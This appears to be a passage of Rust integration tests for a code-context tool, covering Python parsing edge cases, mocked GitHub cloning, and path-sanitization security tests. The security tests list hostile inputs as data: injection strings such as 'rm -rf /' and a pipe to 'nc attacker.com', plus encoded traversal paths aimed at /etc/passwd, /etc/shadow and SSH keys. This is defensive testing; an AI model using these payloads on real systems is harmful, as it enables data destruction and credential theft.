    if len(username) < 3:
        raise ValidationError("Username too short")
    return username
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("exceptions.py"),
        r#"
class ValidationError(Exception):
    pass

class DatabaseError(Exception):
    pass

class ExportError(Exception):
    pass
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("exporters.py"),
        r#"
import json
import xml.etree.ElementTree as ET
from exceptions import ExportError

class JSONExporter:
    def export(self, data):
        try:
            return json.dumps(data, indent=2)
        except Exception as e:
            raise ExportError(f"JSON export failed: {e}")

class XMLExporter:
    def export(self, data):
        try:
            root = ET.Element("data")
            # Simplified XML export
            return ET.tostring(root, encoding='unicode')
        except Exception as e:
            raise ExportError(f"XML export failed: {e}")
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("main.py"),
        r#"
from models import User, Group
from database import Database
from validators import validate_username

def main():
    # Create users
    user1 = User("Alice", "alice@example.com", 25)
    user2 = User("Bob", "bob@example.com", 30)
    
    # Create group
    group = Group("Developers")
    group.add_user(user1)
    group.add_user(user2)
    
    # Save to database
    user1.save()
    user2.save()
    
    # Export data
    db = Database()
    json_data, xml_data = db.export()
    
    print("Data exported successfully")

if __name__ == "__main__":
    main()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());
    assert!(stdout.contains("main.py"));
    assert!(stdout.contains("models.py"));
    assert!(stdout.contains("database.py"));
    assert!(stdout.contains("validators.py"));
}

/// Test Python with thousands of functions in one file
#[test]
fn test_python_many_functions() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    let mut content = String::new();
    content.push_str("# File with many functions\n\n");

    // Create 1000 functions
    let function_count = 1000;
    for i in 0..function_count {
        content.push_str(&format!(
            r#"
def func_{i}(x):
    """Function number {i}"""
    return x + {i}

"#
        ));
    }

    // Add a main function that calls some of them
    content.push_str("def main():\n    total = 0\n");
    for i in 0..20 {
        content.push_str(&format!("    total += func_{i}({i})\n"));
    }
    content.push_str("    return total\n\n");
    content.push_str("if __name__ == '__main__':\n    print(main())\n");

    fs::write(src_dir.join("many_functions.py"), content).unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success(), "Should handle 1000 functions");
}

/// Test Python with very large classes
#[test]
fn test_python_large_classes() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    let mut content = String::new();
    content.push_str("# File with very large classes\n\n");

    // Create a class with many methods
    content.push_str("class MegaClass:\n");
    content.push_str("    \"\"\"A class with many methods.\"\"\"\n\n");

    // Add 500 methods
    for i in 0..500 {
        content.push_str(&format!(
            r#"    def method_{i}(self):
        """Method number {i}"""
        return {i}

"#
        ));
    }

    // Add 500 class methods
    for i in 0..500 {
        content.push_str(&format!(
            r#"    @classmethod
    def class_method_{i}(cls):
        """Class method number {i}"""
        return {i}

"#
        ));
    }

    // Create instance and use some methods
    content.push_str("\n\ndef test_mega_class():\n");
    content.push_str("    obj = MegaClass()\n");
    for i in 0..10 {
        content.push_str(&format!("    obj.method_{i}()\n"));
        content.push_str(&format!("    MegaClass.class_method_{i}()\n"));
    }

    fs::write(src_dir.join("large_classes.py"), content).unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success(), "Should handle large classes");
}

/// Test Python with extremely deep nesting
#[test]
fn test_python_deep_nesting() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");

    // Create deeply nested package structure
    let mut current_dir = src_dir.clone();
    let depth = 20;

    for i in 0..depth {
        current_dir = current_dir.join(format!("level{i}"));
        fs::create_dir_all(&current_dir).unwrap();

        // Add __init__.py
        fs::write(
            current_dir.join("__init__.py"),
            format!(
                r#"
"""Level {i} package"""
from .module import func_{i}
"#
            ),
        )
        .unwrap();

        // Add module.py
        fs::write(
            current_dir.join("module.py"),
            format!(
                r#"
def func_{i}():
    """Function at level {i}"""
    return {i}
"#
            ),
        )
        .unwrap();
    }

    // Create main file that imports from deep nesting
    fs::write(
        src_dir.join("main.py"),
        r#"
# Import from deeply nested module
from level0.level1.level2.level3.module import func_3

def main():
    result = func_3()
    print(f"Result from deep import: {result}")

if __name__ == "__main__":
    main()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success(), "Should handle deep nesting");
}

/// Test Python with mixed file types
#[test]
fn test_python_mixed_files() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Regular Python file
    fs::write(
        src_dir.join("regular.py"),
        r#"
def regular_function():
    return "regular"
"#,
    )
    .unwrap();

    // Python file with .pyw extension (Windows GUI scripts)
    fs::write(
        src_dir.join("gui_script.pyw"),
        r#"
import tkinter as tk

def create_window():
    root = tk.Tk()
    return root
"#,
    )
    .unwrap();

    // Cython-like file (though not compiled)
    fs::write(
        src_dir.join("cython_module.pyx"),
        r#"
# This would be Cython code
def fast_function(int x):
    cdef int result = x * 2
    return result
"#,
    )
    .unwrap();

    // Python stub file
    fs::write(
        src_dir.join("stubs.pyi"),
        r#"
# Type stub file
def typed_function(x: int) -> str: ...

class TypedClass:
    def method(self) -> None: ...
"#,
    )
    .unwrap();

    // Setup.py
    fs::write(
        src_dir.join("setup.py"),
        r#"
from setuptools import setup, find_packages

setup(
    name="test-package",
    version="0.1.0",
    packages=find_packages(),
)
"#,
    )
    .unwrap();

    // __main__.py for package execution
    fs::write(
        src_dir.join("__main__.py"),
        r#"
from regular import regular_function

if __name__ == "__main__":
    print(regular_function())
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success());
}

/// Test Python with various string types and formats
#[test]
fn test_python_string_complexity() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("strings.py"),
        r#"
# Various string formats and edge cases

# Triple quoted strings with quotes inside
sql_query = """
SELECT * FROM users
WHERE name = 'John' AND status = "active"
AND description = '''multiple quotes'''
"""

# Raw strings with backslashes
regex_pattern = r"C:\Users\(?P<username>\w+)\Documents\.*\.txt"
raw_multiline = r"""
Line 1\n is literal
Line 2\t has literal tabs
"""

# F-strings with complex expressions
name = "Alice"
age = 30
complex_fstring = f"""
User: {name.upper()}
Age in months: {age * 12}
Is adult: {age >= 18}
Nested: {f"Hello {name}"}
Expression: {[x**2 for x in range(5)]}
"""

# Unicode strings
unicode_art = """
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘   Unicode Box â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
"""

# String with embedded code-like content
code_in_string = '''
def fake_function():
    # This looks like code but it's a string
    import os
    return "not real code"
'''

# Docstring that looks like it has imports
def tricky_function():
    """
    This function does something.
    
    Example:
        >>> import sys
        >>> from collections import defaultdict
        >>> tricky_function()
    
    Note: The above imports are in a docstring, not real imports.
    """
    pass

# Byte strings
byte_data = b"Binary \x00\x01\x02 data"
byte_multiline = b"""
Multi-line
byte string
"""

# Format strings
old_style = "Hello %s, you are %d years old" % (name, age)
new_style = "Hello {}, you are {} years old".format(name, age)
template = "{name} is {age} years old".format(name=name, age=age)
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success(), "Should handle complex strings");
}

/// Test Python with concurrent/parallel patterns
#[test]
fn test_python_concurrency_patterns() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("concurrency.py"),
        r#"
import asyncio
import threading
import multiprocessing
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from typing import List, Callable
import queue

# Threading example
class ThreadedWorker(threading.Thread):
    def __init__(self, task_queue: queue.Queue):
        super().__init__()
        self.task_queue = task_queue
        self.daemon = True
    
    def run(self):
        while True:
            task = self.task_queue.get()
            if task is None:
                break
            task()
            self.task_queue.task_done()

# Multiprocessing example
def process_worker(data):
    return sum(data)

def parallel_sum(data_chunks: List[List[int]]) -> int:
    with ProcessPoolExecutor() as executor:
        results = executor.map(process_worker, data_chunks)
        return sum(results)

# Asyncio patterns
async def fetch_data(session, url):
    # Simulated async fetch
    await asyncio.sleep(0.1)
    return f"Data from {url}"

async def fetch_many(urls: List[str]):
    tasks = []
    for url in urls:
        task = asyncio.create_task(fetch_data(None, url))
        tasks.append(task)
    
    results = await asyncio.gather(*tasks)
    return results

# Thread pool pattern
def thread_pool_example(functions: List[Callable]):
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(func) for func in functions]
        results = [f.result() for f in futures]
        return results

# Lock and synchronization
class SharedCounter:
    def __init__(self):
        self._value = 0
        self._lock = threading.Lock()
    
    def increment(self):
        with self._lock:
            self._value += 1
    
    @property
    def value(self):
        with self._lock:
            return self._value

# Asyncio with threading
def run_async_in_thread(coro):
    def thread_target():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            return loop.run_until_complete(coro)
        finally:
            loop.close()
    
    thread = threading.Thread(target=thread_target)
    thread.start()
    thread.join()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success());
}
```

## tests/remote_parsing_test.rs

Imports: assert_cmd::prelude::*, predicates::prelude::*, std::fs, std::process::Command, tempfile::TempDir, std::os::unix::fs::PermissionsExt

Type references: fs, std::process::Command.Command, tempfile::TempDir.TempDir, std::os::unix::fs::PermissionsExt.PermissionsExt, std::os::unix::fs::PermissionsExt.PermissionsExt

```rust
use assert_cmd::prelude::*;
use predicates::prelude::*;
use std::fs;
use std::process::Command;
use tempfile::TempDir;

#[test]
#[cfg_attr(windows, ignore = "Mock gh command has issues on Windows CI")]
fn test_github_repo_parsing_with_gh() {
    let temp_dir = TempDir::new().unwrap();
    let mock_bin_dir = temp_dir.path().join("bin");
    fs::create_dir(&mock_bin_dir).unwrap();

    // Create the mock gh script
    let _mock_repo_path = temp_dir.path().join("repo");

    #[cfg(unix)]
    {
        let mock_gh_path = mock_bin_dir.join("gh");
        let script = r#"#!/bin/sh
# Mock gh command
if [ "$1" = "repo" ] && [ "$2" = "clone" ]; then
    # The 4th argument is the target directory path (e.g., /tmp/xyz/repo)
    target_dir="$4"
    # Simulate cloning by creating the directory structure
    mkdir -p "$target_dir/src"
    echo 'fn main() {{}}' > "$target_dir/src/main.rs"
    echo '# Mock Repo' > "$target_dir/README.md"
    echo 'name = "mock-repo"' > "$target_dir/Cargo.toml"
    echo "Cloned successfully"
    exit 0
fi
if [ "$1" = "--version" ]; then
    echo "gh version 2.40.0"
    exit 0
fi
exit 1
"#;
        fs::write(&mock_gh_path, script).unwrap();

        // Make the mock script executable
        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&mock_gh_path, fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[cfg(windows)]
    {
        // On Windows, create gh.cmd which will be found by Command::new("gh")
        let script = r#"@echo off
echo Arguments: %* >> gh_debug.log
if "%1" == "--version" (
    echo gh version 2.40.0
    exit /b 0
)
if "%1" == "repo" if "%2" == "clone" (
    rem Extract the target directory from arguments
    rem Arguments are: repo clone fake/repo C:\path\to\temp\repo -- --depth 1
    set "target_dir=%~4"
    echo Target dir: %target_dir% >> gh_debug.log
    
    rem Create the directory structure
    if not exist "%target_dir%" mkdir "%target_dir%"
    if not exist "%target_dir%\src" mkdir "%target_dir%\src"
    
    rem Create mock files
    echo fn main() {} > "%target_dir%\src\main.rs"
    echo # Mock Repo > "%target_dir%\README.md"
    echo name = "mock-repo" > "%target_dir%\Cargo.toml"
    
    echo Cloned successfully
    exit /b 0
)
echo Command not recognized >> gh_debug.log
exit /b 1
"#;
        fs::write(mock_bin_dir.join("gh.cmd"), script).unwrap();
    }

    let mut cmd = Command::cargo_bin("context-creator").unwrap();

    // Prepend the mock bin directory to the PATH
    let original_path = std::env::var("PATH").unwrap_or_default();
    #[cfg(windows)]
    let new_path = format!("{};{}", mock_bin_dir.display(), original_path);
    #[cfg(not(windows))]
    let new_path = format!("{}:{}", mock_bin_dir.display(), original_path);

    cmd.env("PATH", new_path);
    cmd.arg("--repo").arg("https://github.com/fake/repo");

    cmd.assert()
        .success()
        .stdout(predicate::str::contains("main.rs"))
        .stdout(predicate::str::contains("README.md"));
}

#[test]
#[ignore = "Git fallback test has issues with mock script"]
fn test_github_repo_parsing_fallback_to_git() {
    let temp_dir = TempDir::new().unwrap();
    let mock_bin_dir = temp_dir.path().join("bin");
    fs::create_dir(&mock_bin_dir).unwrap();

    // Create mock git script (no gh available)
    let mock_git_path = mock_bin_dir.join("git");
    let _mock_repo_path = temp_dir.path().join("repo");

    #[cfg(unix)]
    {
        let script = r#"#!/bin/sh
# Mock git command
if [ "$1" = "clone" ]; then
    # For git clone, the last argument is the target directory
    # Find the last argument
    for last; do true; done
    target_dir="$last"
    # Simulate cloning by creating a directory with files
    mkdir -p "$target_dir/src"
    echo 'fn main() {{}}' > "$target_dir/src/main.rs"
    echo '# Mock Repo' > "$target_dir/README.md"
    echo Cloned successfully
    exit 0
fi
if [ "$1" = "--version" ]; then
    echo "git version 2.40.0"
    exit 0
fi
exit 1
"#;
        fs::write(&mock_git_path, script).unwrap();

        use std::os::unix::fs::PermissionsExt;
        fs::set_permissions(&mock_git_path, fs::Permissions::from_mode(0o755)).unwrap();
    }

    #[cfg(windows)]
    {
        let script = r#"@echo off
if "%1" == "clone" (
    rem For git clone, the last argument is the target directory
    rem Get the last argument using a simple approach
    for %%a in (%*) do set "target_dir=%%a"
    mkdir "%target_dir%\src" 2>nul
    echo fn main() {} > "%target_dir%\src\main.rs"
    echo # Mock Repo > "%target_dir%\README.md"
    echo Cloned successfully
    exit /b 0
)
if "%1" == "--version" (
    echo git version 2.40.0
    exit /b 0
)
exit /b 1
"#;
        fs::write(mock_git_path.with_extension("bat"), script).unwrap();
    }

    let mut cmd = Command::cargo_bin("context-creator").unwrap();

    // Set PATH with only our mock bin (no gh available)
    cmd.env("PATH", mock_bin_dir.display().to_string());
    cmd.arg("--repo").arg("https://github.com/fake/repo");

    cmd.assert()
        .success()
        .stdout(predicate::str::contains("main.rs"));
}

#[test]
fn test_invalid_repo_url() {
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--repo").arg("https://gitlab.com/fake/repo");

    cmd.assert().failure().stderr(predicate::str::contains(
        "Repository URL must be a GitHub URL",
    ));
}

#[test]
fn test_repo_and_directory_mutually_exclusive_cli() {
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--repo")
        .arg("https://github.com/fake/repo")
        .arg(".");

    cmd.assert().failure().stderr(predicate::str::contains(
        "Cannot specify both --repo and local paths",
    ));
}

#[test]
fn test_no_git_or_gh_available() {
    let temp_dir = TempDir::new().unwrap();
    let empty_bin_dir = temp_dir.path().join("bin");
    fs::create_dir(&empty_bin_dir).unwrap();

    let mut cmd = Command::cargo_bin("context-creator").unwrap();

    // Set PATH to empty directory (no commands available)
    cmd.env("PATH", empty_bin_dir.display().to_string());
    cmd.arg("--repo").arg("https://github.com/fake/repo");

    cmd.assert().failure().stderr(predicate::str::contains(
        "Neither gh CLI nor git is available",
    ));
}

#[test]
#[ignore = "Real repository test - requires network and git/gh CLI"]
fn test_parse_own_repository() {
    // This test requires gh or git to be available and network access
    // Use our own repository as the test case
    let mut cmd = Command::cargo_bin("context-creator").unwrap();
    cmd.arg("--repo")
        .arg("https://github.com/matiasvillaverde/context-creator");

    let assert = cmd.assert();

    // Should succeed and contain our key source files
    assert
        .success()
        .stdout(predicate::str::contains("src/main.rs"))
        .stdout(predicate::str::contains("src/lib.rs"))
        .stdout(predicate::str::contains("Cargo.toml"));
}
```

## tests/security_stress_test.rs

Imports: context_creator, std::fs, tempfile::TempDir, context_creator::core::walker::walk_directory, std::time::Instant, context_creator::utils::error::ContextCreatorError, std::sync::Arc, std::thread

Type references: fs, tempfile::TempDir.TempDir, walk_directory, context_creator.WalkOptions, std::time::Instant.Instant, context_creator::utils::error::ContextCreatorError.ContextCreatorError, ContextCreatorError.FileProcessingError, FileProcessingError, thread

```rust
//! Stress tests for security fixes to find potential bugs and edge cases

use context_creator::core::walker::{sanitize_pattern, WalkOptions};
use std::fs;
use tempfile::TempDir;

#[test]
fn test_sanitization_stress_boundary_conditions() {
    // Test edge cases that might reveal bugs in boundary checking

    // Test exactly at boundary
    let exactly_1000 = "a".repeat(1000);
    assert!(sanitize_pattern(&exactly_1000).is_ok());

    // Test just over boundary
    let just_over = "a".repeat(1001);
    assert!(sanitize_pattern(&just_over).is_err());

    // Test way over boundary
    let way_over = "a".repeat(10000);
    assert!(sanitize_pattern(&way_over).is_err());
}

#[test]
fn test_sanitization_stress_unicode_edge_cases() {
    // Test Unicode characters that might bypass security checks

    // Unicode dots that could be used for traversal
    let unicode_dots = "file\u{002e}\u{002e}/secret";
    assert!(
        sanitize_pattern(unicode_dots).is_err(),
        "Unicode dots should be rejected"
    );

    // Unicode null
    let unicode_null = "file\u{0000}.txt";
    assert!(
        sanitize_pattern(unicode_null).is_err(),
        "Unicode null should be rejected"
    );

    // Unicode separators
    let unicode_sep = "file\u{2028}name.txt"; // Line separator
    assert!(
        sanitize_pattern(unicode_sep).is_err(),
        "Unicode line separator should be rejected"
    );

    // Valid Unicode
    let valid_unicode = "Ñ„Ð°Ð¹Ð»*.txt";
    assert!(
        sanitize_pattern(valid_unicode).is_ok(),
        "Valid Unicode should be allowed"
    );
}

#[test]
fn test_sanitization_stress_mixed_attacks() {
    // Test patterns that combine multiple attack vectors

    let mixed_attacks = vec![
        "../\0secret.txt",    // Traversal + null
        "/etc/passwd\x01",    // Absolute + control
        "..\\..\\file\0.txt", // Windows traversal + null
        "\x7f../secret",      // Control + traversal
        "/\0\x01\x02\x03",    // Multiple violations
    ];

    for pattern in mixed_attacks {
        assert!(
            sanitize_pattern(pattern).is_err(),
            "Mixed attack pattern should be rejected: {pattern:?}"
        );
    }
}

#[test]
fn test_parallel_error_handling_stress() {
    // Test error handling under stress conditions
    use context_creator::core::walker::walk_directory;

    let temp_dir = TempDir::new().unwrap();
    let root = temp_dir.path();

    // Create some files
    fs::write(root.join("file1.txt"), "content1").unwrap();
    fs::write(root.join("file2.txt"), "content2").unwrap();

    // Test with malicious patterns
    let malicious_options = WalkOptions {
        max_file_size: Some(1024),
        follow_links: false,
        include_hidden: false,
        parallel: true,
        ignore_file: ".context-creator-ignore".to_string(),
        ignore_patterns: vec![],
        include_patterns: vec!["../../../etc/passwd".to_string()],
        custom_priorities: vec![],
        filter_binary_files: false,
    };

    // This should fail due to sanitization
    let result = walk_directory(root, malicious_options);
    assert!(result.is_err(), "Malicious patterns should be rejected");

    let error_msg = format!("{result:?}");
    assert!(error_msg.contains("Directory traversal") || error_msg.contains("Invalid"));
}

#[test]
fn test_sanitization_performance_dos_prevention() {
    // Test that sanitization doesn't have performance vulnerabilities
    use std::time::Instant;

    // Test with patterns designed to cause regex DoS
    let potentially_slow_patterns = vec![
        "a".repeat(1000),     // Long string
        "a*".repeat(100),     // Many wildcards
        "{a,b}".repeat(50),   // Many alternatives
        "[a-z]*".repeat(100), // Many character classes
    ];

    for pattern in potentially_slow_patterns {
        let start = Instant::now();
        let _result = sanitize_pattern(&pattern);
        let duration = start.elapsed();

        // Sanitization should be very fast (under 1ms for these patterns)
        assert!(
            duration.as_millis() < 10,
            "Sanitization took too long: {:?} for pattern length {}",
            duration,
            pattern.len()
        );
    }
}

#[test]
fn test_error_classification_edge_cases() {
    // Test edge cases in error classification that might cause misclassification

    use context_creator::utils::error::ContextCreatorError;

    // Test errors that contain keywords but shouldn't be critical
    let non_critical_errors = vec![
        "File contains the word Permission denied but isn't actually permission denied",
        "Invalid file format, not Invalid configuration",
        "This message mentions Permission denied in passing",
    ];

    for error_text in non_critical_errors {
        let error = ContextCreatorError::FileProcessingError {
            path: "test.txt".to_string(),
            error: error_text.to_string(),
        };

        let error_string = error.to_string();

        // These should still be classified as critical due to keywords
        // This test documents current behavior - keywords anywhere trigger critical classification
        assert!(error_string.contains("Permission denied") || error_string.contains("Invalid"));
    }
}

#[test]
fn test_sanitization_injection_resistance() {
    // Test resistance to various injection attacks

    let large_buffer = "A".repeat(100000);
    let injection_attempts = vec![
        // Command injection attempts
        "file.txt; rm -rf /",
        "file.txt && cat /etc/passwd",
        "file.txt | nc attacker.com 1234",
        // Path injection attempts
        "file.txt\n../../../etc/passwd",
        "file.txt\r\n/etc/shadow",
        // Format string attempts
        "%s%s%s%s",
        "%n%n%n%n",
        // Buffer overflow attempts
        &large_buffer,
    ];

    for pattern in injection_attempts {
        // Sanitization should handle these gracefully
        let result = sanitize_pattern(pattern);

        // Most should be rejected, but shouldn't crash
        if result.is_ok() {
            // If accepted, should be exactly the same string (no interpretation)
            assert_eq!(result.unwrap(), pattern);
        }
        // If rejected, that's also fine and expected for many of these
    }
}

#[test]
fn test_concurrent_sanitization_safety() {
    // Test that sanitization is thread-safe and doesn't have race conditions
    use std::sync::Arc;
    use std::thread;

    let patterns: Arc<Vec<String>> = Arc::new(vec![
        "*.py".to_string(),
        "../../../etc/passwd".to_string(),
        "file\0.txt".to_string(),
        "/etc/shadow".to_string(),
        "valid_pattern.rs".to_string(),
        "a".repeat(2000),
    ]);

    let mut handles = vec![];

    // Spawn multiple threads to test concurrently
    for _ in 0..10 {
        let patterns_clone: Arc<Vec<String>> = Arc::clone(&patterns);
        let handle = thread::spawn(move || {
            for pattern in patterns_clone.iter() {
                let result = sanitize_pattern(pattern);

                // Results should be consistent across threads
                match pattern.as_str() {
                    "*.py" | "valid_pattern.rs" => {
                        assert!(result.is_ok(), "Valid pattern should always be accepted");
                    }
                    p if p.contains("..")
                        || p.contains('\0')
                        || p.starts_with('/')
                        || p.len() > 1000 =>
                    {
                        assert!(result.is_err(), "Invalid pattern should always be rejected");
                    }
                    _ => {} // Other patterns can vary
                }
            }
        });
        handles.push(handle);
    }

    // Wait for all threads to complete
    for handle in handles {
        handle.join().expect("Thread should complete successfully");
    }
}

#[test]
fn test_memory_safety_large_inputs() {
    // Test memory safety with large inputs that could cause issues

    // Very large pattern
    let huge_pattern = "x".repeat(100_000);
    let result = sanitize_pattern(&huge_pattern);
    assert!(result.is_err(), "Huge pattern should be rejected");

    // Pattern with many null bytes
    let many_nulls = "\0".repeat(1000);
    let result = sanitize_pattern(&many_nulls);
    assert!(
        result.is_err(),
        "Pattern with many nulls should be rejected"
    );

    // These operations should not cause memory corruption or crashes
}
```

## tests/security_vulnerability_test.rs

Imports: context_creator::core::semantic::path_validator::validate_import_path, std::fs, std::path::Path, std::thread, std::time::Duration, tempfile::TempDir, std::os::unix::fs::symlink

Type references: validate_import_path, fs, std::path::Path.Path, thread, std::time::Duration.Duration, tempfile::TempDir.TempDir, symlink, symlink

```rust
//! Tests demonstrating security vulnerabilities before fixes
//! These tests SHOULD FAIL initially, proving the vulnerabilities exist

use context_creator::core::semantic::path_validator::validate_import_path;
use std::fs;
use std::path::Path;
use std::thread;
use std::time::Duration;
use tempfile::TempDir;

#[test]
#[ignore] // Remove ignore after implementing fixes
fn test_toctou_race_condition_vulnerability() {
    // This test demonstrates a Time-of-Check-Time-of-Use vulnerability
    // where an attacker can create a symlink between the check and use

    let temp_dir = TempDir::new().unwrap();
    let base_dir = temp_dir.path();

    // Create a safe target file
    let safe_file = base_dir.join("safe.txt");
    fs::write(&safe_file, "safe content").unwrap();

    // Path that will be swapped via symlink
    let target_path = base_dir.join("target.txt");

    // Initially create a safe file
    fs::write(&target_path, "initial safe content").unwrap();

    // Spawn attacker thread that will swap the file with a symlink
    let attacker_target = target_path.clone();
    let attacker_thread = thread::spawn(move || {
        // Wait a tiny bit for the validation to start
        thread::sleep(Duration::from_micros(100));

        // Remove the safe file and create symlink to /etc/passwd
        fs::remove_file(&attacker_target).ok();
        #[cfg(unix)]
        {
            use std::os::unix::fs::symlink;
            symlink("/etc/passwd", &attacker_target).ok();
        }
    });

    // Try to validate the path multiple times to increase chance of hitting race
    for _ in 0..100 {
        let result = validate_import_path(base_dir, &target_path);

        // If validation passes but file is now a symlink to /etc/passwd, we have a vulnerability
        if result.is_ok() {
            #[cfg(unix)]
            {
                if let Ok(link_target) = fs::read_link(&target_path) {
                    if link_target.to_str() == Some("/etc/passwd") {
                        panic!("VULNERABILITY: Path validation passed for symlink to /etc/passwd!");
                    }
                }
            }
        }
    }

    attacker_thread.join().unwrap();
}

#[test]
fn test_url_encoding_bypass_vulnerability() {
    // This test demonstrates that URL-encoded path traversal can bypass validation

    let temp_dir = TempDir::new().unwrap();
    let base_dir = temp_dir.path();

    // Create a test file structure
    fs::create_dir_all(base_dir.join("src")).unwrap();
    fs::write(base_dir.join("src/main.rs"), "fn main() {}").unwrap();

    // Various URL-encoded path traversal attempts that should be blocked
    let url_encoded_attacks = vec![
        // Single encoding
        "src/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "src/%2E%2E/%2E%2E/%2E%2E/etc/passwd", // Uppercase
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        // Double encoding
        "src/%252e%252e/%252e%252e/etc/passwd",
        // Mixed encoding
        "src/%2e%2e/../etc/passwd",
        "src/../%2e%2e/etc/passwd",
        // Unicode/UTF-8 encoding variants
        "src/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", // Overlong UTF-8
        // Null byte injection
        "src/../etc/passwd%00.rs",
        // Alternative encodings
        "src/%252E%252E%252F%252E%252E%252Fetc%252Fpasswd",
        // More sophisticated attacks
        "%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd", // Backslash encoding
        "src/%u002e%u002e/%u002e%u002e/etc/passwd", // Unicode encoding
        "src/..%c0%af..%c0%afetc%c0%afpasswd", // Modified UTF-8
        "%2e%2e%252f%2e%2e%252fetc%252fpasswd", // Mixed double encoding
    ];

    for attack in url_encoded_attacks {
        let attack_path = base_dir.join(attack);
        let result = validate_import_path(base_dir, &attack_path);

        if result.is_ok() {
            panic!("VULNERABILITY: URL-encoded attack passed validation: {attack}");
        }
    }
}

#[test]
fn test_mixed_slash_bypass_vulnerability() {
    // Test Windows-style backslash attacks on Unix systems

    let temp_dir = TempDir::new().unwrap();
    let base_dir = temp_dir.path();

    let attacks = vec![
        "src\\..\\..\\etc\\passwd",
        "src/..\\../etc/passwd",
        "src\\../..\\etc/passwd",
        // URL encoded backslashes
        "src%5c..%5c..%5cetc%5cpasswd",
        "src%5C..%5C..%5Cetc%5Cpasswd",
    ];

    for attack in attacks {
        let attack_path = base_dir.join(attack);
        let result = validate_import_path(base_dir, &attack_path);

        // On Unix, backslashes might be treated as literal characters
        // But the validator should normalize these
        if result.is_ok() {
            if let Ok(canonical) = attack_path.canonicalize() {
                if !canonical.starts_with(base_dir) {
                    panic!("VULNERABILITY: Mixed slash attack escaped base directory: {attack}");
                }
            }
        }
    }
}

#[test]
fn test_symlink_escape_vulnerability() {
    // Test if symlinks can escape the project directory

    #[cfg(unix)]
    {
        let temp_dir = TempDir::new().unwrap();
        let base_dir = temp_dir.path();
        use std::os::unix::fs::symlink;

        // Create a symlink pointing outside
        let symlink_path = base_dir.join("escape_link");
        symlink("/etc/passwd", &symlink_path).unwrap();

        let result = validate_import_path(base_dir, &symlink_path);

        if result.is_ok() {
            panic!("VULNERABILITY: Symlink to /etc/passwd passed validation!");
        }
    }
}

#[test]
fn test_absolute_path_outside_project() {
    // Test that absolute paths outside project are rejected

    let temp_dir = TempDir::new().unwrap();
    let base_dir = temp_dir.path();

    let attacks = vec![
        Path::new("/etc/passwd"),
        Path::new("/home/user/.ssh/id_rsa"),
        Path::new("/var/log/secure"),
        #[cfg(windows)]
        Path::new("C:\\Windows\\System32\\config\\SAM"),
    ];

    for attack_path in attacks {
        if attack_path.exists() {
            // Only test if the path exists on this system
            let result = validate_import_path(base_dir, attack_path);

            if result.is_ok() {
                panic!(
                    "VULNERABILITY: Absolute path outside project passed validation: {attack_path:?}"
                );
            }
        }
    }
}

#[test]
fn test_path_normalization_attacks() {
    // Test various path normalization attacks

    let temp_dir = TempDir::new().unwrap();
    let base_dir = temp_dir.path();

    let attacks = vec![
        // Multiple separators
        "src//..//..//..//etc//passwd",
        "src/./././../../../etc/passwd",
        // Current directory references
        "./../../etc/passwd",
        "././././../../../etc/passwd",
        // Trailing dots (Windows)
        "src../../../etc/passwd...",
        "src.../..../.../etc/passwd",
        // Leading dots
        "...src/../../etc/passwd",
    ];

    for attack in attacks {
        let attack_path = base_dir.join(attack);
        let result = validate_import_path(base_dir, &attack_path);

        // Try to resolve manually to check if it escapes
